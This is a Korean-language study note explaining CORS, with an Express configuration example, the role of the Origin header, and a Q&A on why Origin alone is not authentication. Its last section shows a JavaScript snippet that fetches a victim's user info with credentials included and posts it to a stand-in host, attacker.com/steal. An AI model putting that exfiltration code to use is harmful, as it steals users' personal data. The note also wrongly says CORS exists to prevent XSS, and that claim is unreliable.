# CORS란 무엇인가?

- CORS(Cross-Origin Resource Sharing)는 웹 애플리케이션이 다른 도메인, 프로토콜 또는 포트에서 리소스에 접근할 수 있도록 허용하는 보안 기능이다. 기본적으로 웹 브라우저는 보안상의 이유로 서로 다른 출처에서의 요청을 제한하는데, CORS는 이를 관리하고 제어하는 메커니즘이다.
- 핵심은 서버는 요청에따라 결과를 주는것을 막을수는 없지만, 브라우저단에서 막는 것이다
  - 즉, 우리 브라우저를 쓰는 동안은 위험 사이트를 들어가도 보호한다가 핵심 컨셉이다(브라우저는 사용자의 편이다)
- 공격자가 희생자의 브라우저 권한(쿠키/세션)을 이용해 교차 출처(Cross-Origin)로 보낸 요청의 응답 데이터를, 브라우저 인입 단에서 자바스크립트가 읽지 못하도록 격리하는 샌드박스 기술
  - 브라우저는 기본적으로 "탭 단위"로 쿠키를 격리하지 않고, "프로필(도메인) 단위"로 공유하기 때문이다

## 왜 CORS가 필요한가?

- 기본적으로 브라우저는 서로 다른 출처 간의 요청을 차단하여 XSS(교차 사이트 스크립팅) 공격을 방지한다. CORS는 이를 우회할 수 있는 방법을 제공한다.

## CORS 설정 예시

> CORS는 받은 요청을 허용할지 말지에 대한 서버가 요청을 받을때 기본설정이다. 

```javascript

const express = require('express');
const cors = require('cors');
const app = express();

// CORS 설정
app.use(cors({
    origin: 'https://example.com', // 허용할 출처
    methods: 'GET,POST,PUT,DELETE', // 허용할 메서드
    allowedHeaders: 'Content-Type,Authorization', // 허용할 헤더
    credentials: true // 인증 정보 허용
}));

app.get('/api/data', (req, res) => {
    res.json({ message: 'Hello, CORS!' });
});

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});

```

### 예시

- front가 https://example.com:443 에서 서버로 요청을 보내면
- Orgin은 https://example.com:443 이 된다
    - 이 Origin은 브라우저가 자동 작성해주는 것으로, 브라우저의 기능을 통해 cors보안을 할 수 있는 것이다(상호 규약)
    - 이 Origin은 브라우저가 자동으로 작성하는 값이며, 브라우저는 이 값을 바탕으로 CORS 보안 정책을 적용한다
    - 즉, 서버가 이 Origin을 보고 요청을 허용할지 거부할지 판단하게 된다
- explorer 같은 경우는 port가 다르더라도 수신이 가능해 보안상 심각한 문제가 있었다(origin이 443포트가 아닌 8123포트여도 송수신이 문제없이 가능했던 이슈)

### 의문들

- Q : cors 는 그럼 헤더에 origin:원하는 사이트만 넣으면 되는 굉장히 허술한거아님? 토큰이 없다면 어떻게 검증함?
    -  CORS 자체는 보안 기술이라기보다, 브라우저에 명령하는 “정책”에 가깝다. CORS는 클라이언트(브라우저)를 제어하기 위한 것이지, 서버 보안을 보장하지 않는다.
    - 브라우저가 보내주는 Origin은 그냥 "신고"일 뿐이다. 진짜 인증은 별도의 메커니즘으로 해야 한다.
    - 그래서 보통 jwt, session 등을 보안요소로 사용하고, origin만 사용하는 것은 굉장히 위험하다

### js를 해커가 사용하게 되면 위험한 이유
```javascript
fetch('https://example.com/api/user-info', {
  method: 'GET',
  credentials: 'include', // ← 세션 쿠키까지 보내라는 명령
})
.then(res => res.json())
.then(data => {
  // 피해자의 개인정보 data를 빼감
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  })
})
```